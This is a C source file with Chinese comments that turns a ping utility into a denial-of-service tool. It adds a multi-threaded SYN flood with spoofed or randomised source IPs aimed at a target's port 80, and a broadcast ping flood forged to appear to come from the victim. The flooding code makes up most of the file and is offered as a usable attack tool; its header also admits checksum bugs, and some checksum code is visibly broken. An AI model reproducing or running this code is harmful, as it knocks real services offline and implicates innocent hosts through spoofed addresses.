/*
 * 描述：基于C语言实现ping的源代码改造
 *       加入ddos中SYN泛洪攻击和Ping泛洪攻击
 * 存在问题：校验和算法存在些许问题
 *
 */
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <sys/time.h>
#include <sys/types.h>
#include <malloc.h>
#include <netdb.h>

#define PACKET_SEND_MAX_NUM 64
#define ICMP_PACKET_SIZE 64
#define MAXCHILD 7
#define FAKE_IP "192.168.197.200"
#define PROTO_ICMP 1
#define PROTO_TCP 6
#define SYN_FLOOD 1
#define PING_FLOOD 2
#define PING 3

typedef struct ping_packet_status_t{
    struct timeval begin_time;
    struct timeval end_time;
    int flag;  // 发送标志，1为发送
    int seq;   // 包的序列号
}ping_packet_status_t;

/* 增加伪首部的TCP SYN 报文  */
typedef struct psdh_tcp_t{
    unsigned int src_addr;
    unsigned int dst_addr;
    char to_zero;   
    char protocol;
    signed short window;
    struct tcphdr tcph;
}psdh_tcp_t;

typedef struct syn_packet_t{
    struct ip iph;
    struct tcphdr tcph;
} syn_packet_t;

/* Ping flood 使用的伪装报文  */
typedef struct fake_ping_packet_t{
    struct ip iph;
    struct icmp icmph;

}fake_ping_packet_t;

int alive = -1;
int rawsock = 0;
int f_command = -1;  /* 配合f_sigint函数使用用来中断函数过程 */

ping_packet_status_t ping_packets[PACKET_SEND_MAX_NUM];
int send_count;
int recv_count;
pid_t pid;
struct timeval start_time;
struct timeval end_time;
struct timeval time_interval;

static unsigned long dest = 0;
static unsigned short dest_port = 0;
int is_random = 0;  /* SYN flood  SYN flood中判断是否随机生成源地址 */

/*--0 公用函数  --*/
/*- 校验和算法 -*/
static unsigned short check_sum(unsigned short *data, int length){
    register int left = length;
    register unsigned short *word = data;
    register int sum = 0;
    unsigned short ret = 0;
	
    while(left > 1){
	sum += *word++;
	left -= 2;
    }
	
    if(left == 1){
	*(unsigned char *)(&ret) = *(unsigned char *)word;
	sum += ret;
    }
	
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
	
    ret = ~sum;
    return (ret);
}		
/*- 域名转换为IP地址 -*/
int name_to_addr(char* name, char* addr){ 
    struct hostent* host = gethostbyname(name);
    if(host == NULL){
        printf("Invalid Domain name!\n");
        return -1;
     } else {
        memcpy(addr, host->h_addr, host->h_length);
        return 0;
    }
}

static inline long my_random(int begin, int end){
    int gap = end - begin + 1;
    int ret = 0;
 
    ret = rand()%gap + begin;
    return ret;
}

struct timeval call_time_offset(struct timeval begin, struct timeval end){
    struct timeval ans;

    ans.tv_sec = end.tv_sec - begin.tv_sec;
    ans.tv_usec = end.tv_usec - begin.tv_usec;
    if(ans.tv_usec < 0){
        ans.tv_sec--;
        ans.tv_usec += 1000000;
    }
    return ans;
}

/*- 中断处理函数 -*/
void f_sigint(int sig){
    alive = 0;
    switch(f_command){
    case 1:
        printf("SYN flood stopped!\n");
        break;
    case 2:
        printf("Ping flood stopped!\n");
        break;
    case 3:
        gettimeofday(&end_time, NULL);
        time_interval = call_time_offset(start_time, end_time);
        break;
    default:
       printf("Game over, bro !!\n");
    }
 }


/* -- 1 ping 基础功能函数 --*/
void icmp_pack(struct icmp* icmp_hdr, int seq, int length){
    int i = 0;
    
    icmp_hdr->icmp_type = ICMP_ECHO;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_cksum = 0;
    icmp_hdr->icmp_id = pid & 0xffff;
    icmp_hdr->icmp_seq = seq;
    for(; i<length; ++i){
        icmp_hdr->icmp_data[i] = i;  // 填充数据，使ICMP报文长度大于64B
    }
    icmp_hdr->icmp_cksum = check_sum((unsigned short*)icmp_hdr, length);
}
int icmp_unpack(char* buf, int len){
    struct timeval begin_time, end_time, offset_time;
    int rtt;
    struct ip* ip_hdr = (struct ip*)buf;
    int ip_hdr_len = ip_hdr->ip_hl * 4;
    struct icmp* icmp = (struct icmp*)(buf + ip_hdr_len);

    len -= ip_hdr_len;
    if(len < 8){
        fprintf(stderr, "Invalid icmp packet,its length is less than 8.\n");
        return -1;
    } 
    if((icmp->icmp_type == ICMP_ECHOREPLY) && (icmp->icmp_id == (pid & 0xffff))){
        if((icmp->icmp_seq < 0) || (icmp->icmp_seq > PACKET_SEND_MAX_NUM)){
            fprintf(stderr, "Icmp packet sequence is out of range.\n");
            return -1;    
        } 
        ping_packets[icmp->icmp_seq].flag = 0;
        begin_time = ping_packets[icmp->icmp_seq].begin_time;
        gettimeofday(&end_time, NULL);
        offset_time = call_time_offset(begin_time, end_time);
        rtt = offset_time.tv_sec*1000 + offset_time.tv_usec/1000;
        printf("%d byte from %s: icmp_seq = %u ttl = %d rtt = %d ms\n",
               len, inet_ntoa(ip_hdr->ip_src), icmp->icmp_seq, ip_hdr->ip_ttl, rtt);
    } else {
        fprintf(stderr, "Invalid icmp packet,its id is not matched.\n");
        return -1;
    }
    return 0;
}

void ping_send(){
    char send_buff[128];
    struct sockaddr_in to;    

    memset(send_buff, 0, sizeof(send_buff));
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = dest;
    to.sin_port = htons(0);

    gettimeofday(&start_time, NULL);  /* 记录第一ping包发出的时间 */
    while(alive){
        int size = 0;
        gettimeofday(&(ping_packets[send_count].begin_time), NULL);
        ping_packets[send_count].flag = 1;
        icmp_pack((struct icmp*)send_buff, send_count, ICMP_PACKET_SIZE);
        size = sendto(rawsock, send_buff, 64, 0, (struct sockaddr*)&to, sizeof(to));
        ++send_count;
        if(size < 0){
            fprintf(stderr, "Send icmp packet fail!\n");
            continue;
        }
        
        sleep(1);
    }
}
void ping_recv(){
    struct timeval tv;

    tv.tv_usec = 200;  /* 设置select函数的超时时间为200us */
    tv.tv_sec = 0;
    fd_set read_fd;
    char recv_buf[512];
    memset(recv_buf, 0 ,sizeof(recv_buf));

    while(alive){
        int ret = 0;
        FD_ZERO(&read_fd);
        FD_SET(rawsock, &read_fd);
        ret = select(rawsock+1, &read_fd, NULL, NULL, &tv);

        switch(ret){
        case -1:
            fprintf(stderr,"fail to select!\n");
            break;
        case 0:
            break;
        default:{
            int size = recv(rawsock, recv_buf, sizeof(recv_buf), 0);
            if(size < 0){
                fprintf(stderr,"recv data fail!\n");
                continue;
            }
 
            ret = icmp_unpack(recv_buf, size);
            if(ret == -1){
                continue;
            }
            ++recv_count; 
            }
            break;
        }
    }
}

void ping_stats_show(){
    long time = time_interval.tv_sec*1000+time_interval.tv_usec/1000;
    /*注意除数不能为零，这里send_count有可能为零，所以运行时提示错误*/
    printf("%d packets transmitted, %d recieved, %d%c packet loss, time %ldms\n",
        send_count, recv_count, (send_count-recv_count)*100/send_count, '%', time);
}


/*-- 2 Ping flood   --*/
void fake_icmp_pack(char* buff){
    struct ip* ip_hdr = (struct ip*)buff;
    struct icmp* icmp_hdr = (struct icmp*)(buff + sizeof(struct ip));
    
    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(sizeof(struct ip) + sizeof(struct icmp));
    ip_hdr->ip_id = htons(getpid());
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = PROTO_ICMP;
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_src.s_addr = dest;
    ip_hdr->ip_dst.s_addr = htonl(INADDR_BROADCAST);
    ip_hdr->ip_sum = check_sum((unsigned short *)ip_hdr, (4*ip_hdr->ip_hl + 1) & ~1);  // (n+1)&~1 如果n为奇数，则加一；如果n为偶数，则不变
    
    int i = 0;
    icmp_hdr->icmp_type = ICMP_ECHO;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_cksum = 0;
    icmp_hdr->icmp_id = pid & 0xffff;
    icmp_hdr->icmp_seq = 0;
    for(; i<ICMP_PACKET_SIZE; ++i){
        icmp_hdr->icmp_data[i] = i;  // 填充数据，使ICMP报文长度大于64B
    }
    icmp_hdr->icmp_cksum = check_sum((unsigned short*)icmp_hdr, ICMP_PACKET_SIZE);

}
void ping_group_send(){
    fake_ping_packet_t buff;
    struct sockaddr_in to;
    
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = htonl(INADDR_BROADCAST);
    to.sin_port = htons(0);

    while(alive){
        int size = 0;
        fake_icmp_pack((char*)&buff);
        size = sendto(rawsock, &buff, 84, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));  /* sizeof(to) is a wrong syntax.
                                                                                                  I spent a half of day to find it out, but I still don't know why. */
        if(size < 0){
            fprintf(stderr, "Group send icmp packet fail!\n");
            continue;
        }

        sleep(1);
    }
}


/*--3 SYN 洪泛函数  --*/
char* get_fake_ip(){
    char* fake_ip = (char*) malloc(16);
    int i = 0, j = 0;
    for(;i < 4; ++i){
        int k = j;
        int n = my_random(1, 254);
        /* 将生成整数转换为字符并加入 fake_ip */
        do{
            fake_ip[j++]= n%10+48;
            n /= 10;
        }while(n);
        fake_ip[j] = '.';
        for(; k<j/2;++k){
            fake_ip[k] = fake_ip[k] + fake_ip[j-1-k];
            fake_ip[j-1-k]= fake_ip[k] - fake_ip[j-1-k];
            fake_ip[k]= fake_ip[k] - fake_ip[j-1-k];
        }
        ++j;
    }
    fake_ip[--j]= '\0';
    return fake_ip;
}
/*- 构造TCP的请求SYN包 -*/
void dos_tcp_packet(char* packet){
    struct ip* ip_hdr = (struct ip*)packet;
    struct tcphdr* tcp_hdr = (struct tcphdr*)(packet + sizeof(struct ip));

    struct psdh_tcp_t* psdh;  /* 伪首部 */

    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
    ip_hdr->ip_id = htons(getpid());
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = PROTO_TCP;
    ip_hdr->ip_sum = 0;
    if(is_random == 1){
        ip_hdr->ip_src.s_addr = inet_addr(get_fake_ip());
    } else {
        ip_hdr->ip_src.s_addr = inet_addr(FAKE_IP);
    }    
    ip_hdr->ip_dst.s_addr = dest;                                       
    ip_hdr->ip_sum = check_sum((unsigned short *)ip_hdr, (4*ip_hdr->ip_hl + 1) & ~1);  
    /* (n+1)&~1 如果n为奇数，则加一；如果n为偶数，则不变 */

    tcp_hdr->source = htons(my_random(0, 65535));
    tcp_hdr->dest = htons(80);
    tcp_hdr->seq = htonl((unsigned long)my_random(0, 65535));
    tcp_hdr->ack_seq = htonl(my_random(0, 65535));
    tcp_hdr->doff = 5;
    tcp_hdr->syn = 1;
    tcp_hdr->window = htons(20);
    tcp_hdr->check = 0;
    tcp_hdr->urg_ptr = 0;
    
    /* 计算TCP报文校验和 */
    psdh = malloc(sizeof(struct psdh_tcp_t));
    psdh->src_addr = ip_hdr->ip_src.s_addr;
    psdh->dst_addr = ip_hdr->ip_dst.s_addr;
    psdh->to_zero = '\0';  /* 强制置零 */
    psdh->protocol = ip_hdr->ip_p;
    psdh->window = ntohs(tcp_hdr->window) + 12 ;
    memcpy(&(psdh->tcph), tcp_hdr,ntohs(tcp_hdr->window));
    tcp_hdr->check = check_sum((unsigned short*)psdh, (psdh->window + 1) & ~1);
}
void dos_attack(){
    /* 
 *      * sockaddr在<sys/socket.h> ; sockaddr_in在<arpa/inet.h> 
 *
 *           * 在网络编程中 sockaddr_in 用于socket定义和赋值；sockaddr用于函数参数
 *                *
 *                     * htons()/htonl() 将端口号由主机字序转换为网络字节序的整数值
 *                          *
 *                               * inet_addr()/inet_ntoa() IP 字符串和网络字节序/sin_addr结构体的相互转化
 *                                    */
    syn_packet_t packet;
    struct sockaddr_in to;
    dos_tcp_packet((char*) &packet);

    to.sin_family = AF_INET;
    to.sin_addr.s_addr = dest;
    to.sin_port = htons(80);
    
    while(alive){
        sendto(rawsock, &packet, 4*packet.iph.ip_hl+sizeof(struct tcphdr), 0, (struct sockaddr*)&to, sizeof(struct sockaddr));
    }
}


/*--- 主函数部分  ---*/
int main(int argc, char* argv[]){
    int size = 128*1024;  /* socket 缓冲区长度 */
    int i = 0, err =  -1;
    char dest_addr_str[80];
    pthread_t send_id,recv_id, attack_thread[MAXCHILD];
    const int opt = 1; 

    memset(dest_addr_str, 0, 80);

    /* 区别不同的命令 无参数：单纯的ping，-s: syn泛洪，-g: ping泛洪 */    
    if(argc < 2){
        printf("Bad Command!\n");
        return -1;
    }
    srand((unsigned)time(NULL));
    /*-SYN flood 实现-*/
    if(strcmp(argv[1], "-s") == 0){
        printf("Analysing your input!\n");
        if(argc < 3){
            printf("------ Bad Input, you may forget inputting the IP.\n");
            return -1;
        }
        dest = inet_addr(argv[2]);
        if(dest == INADDR_NONE){
            int is_ntoa = name_to_addr(argv[2], (char*)&dest);
            if(is_ntoa == -1){ 
                return -1;
            }
        }

        if(argc == 4 && strcmp(argv[3], "-r") == 0){
            is_random = 1;
        }
        
        rawsock = socket(AF_INET, SOCK_RAW, PROTO_TCP);
        if(rawsock < 0){
            printf("Fail to creat socket!\n");
            return -1;
        }
        setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof("1"));
        printf("SYN flood attack start!\n");
        
        alive = 1;
        f_command = SYN_FLOOD;
        signal(SIGINT, f_sigint);
        for(i = 0; i < MAXCHILD; ++i){
            err = pthread_create(&(attack_thread[i]), NULL, (void*)dos_attack, NULL);
            if(err){
                printf("Fail to create thread, error %d, thread id %d \n", err, attack_thread[i]);
            }
        }
        for(i = 0; i < MAXCHILD; ++i){
            pthread_join(attack_thread[i], NULL);
        }
        printf("SYN flood attack finished!\n");
        
        close(rawsock);
    }  
    /*- Ping flood, 向广播地址发送ping命令 -*/ 
    else if (strcmp(argv[1], "-g") == 0) {
        if(argc < 3 || argc > 3){
            printf("Bad input!!\n");
            return -1;
        }
        dest = inet_addr(argv[2]);
        if(dest == INADDR_NONE){
            int is_ntoa = name_to_addr(argv[2], (char*)&dest);
            if(is_ntoa == -1){  
                return -1;
            }
        }
        pid = getpid();
        rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP);
        if(rawsock < 0){
            printf("Fail to create socket!\n");
            return -1;
        }
        setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof("1"));
        int ret =  setsockopt(rawsock, SOL_SOCKET, SO_BROADCAST, (char*)&opt, sizeof(opt));
        if(ret == -1){ 
            printf("Socket can't be set!\n");
            return -1;
        }
        
        printf("Ping Flood will begin!\n ");
                
        alive = 1;  
        f_command = PING_FLOOD;
        signal(SIGINT, f_sigint); 
        if(pthread_create(&send_id, NULL, (void*)ping_group_send, NULL)){
             printf("Fail to create ping send thread!\n");
             return -1;
        }   
        pthread_join(send_id, NULL);       
        close(rawsock);
    } 
    /*- 基本 Ping 的实现 -*/
    else if (argc == 2){
        memcpy(dest_addr_str, argv[1], strlen(argv[1])+1);
        pid = getpid();  // 
        
        rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP);
        if(rawsock < 0){
            printf("Fail to create socket!\n");
            return -1;
        }
        int ret = setsockopt(rawsock, SOL_SOCKET, SO_RCVBUF | SO_BROADCAST, &size, sizeof(size));
        if(ret == -1){
            printf("Socket can't be set!\n");
            return -1;
        }

        dest = inet_addr(argv[1]);
        if(dest == INADDR_NONE){
            int is_ntoa = name_to_addr(argv[1], (char*)&dest);
            if(is_ntoa == -1){  
                return -1;
            }
        }
         printf("PING %s, (%d.%d.%d.%d) 56(84) bytes of data.\n",dest_addr_str, (dest&0x000000ff), (dest&0x0000ff00)>>8,
                (dest&0x00ff0000)>>16, (dest&0xff000000)>>24);
         
         alive = 1;
         f_command = PING;  
         signal(SIGINT, f_sigint); 
         if(pthread_create(&send_id, NULL, (void*)ping_send, NULL)){
             printf("Fail to create ping send thread!\n");
             return -1;
         }   
         if(pthread_create(&recv_id, NULL, (void*)ping_recv, NULL)) {
              printf("Fail to create ping recv thread!\n");          
              return -1;                                                                   
         }                                                    
         pthread_join(send_id, NULL);       
         pthread_join(recv_id, NULL);  
         ping_stats_show();
         close(rawsock);        
    }
    /*-其他操作 -*/ 
    else {
        printf("Invaild Input, this command can't be found!\n");
        return -1;
    }
                                                                                                                   
    return 0; 
}
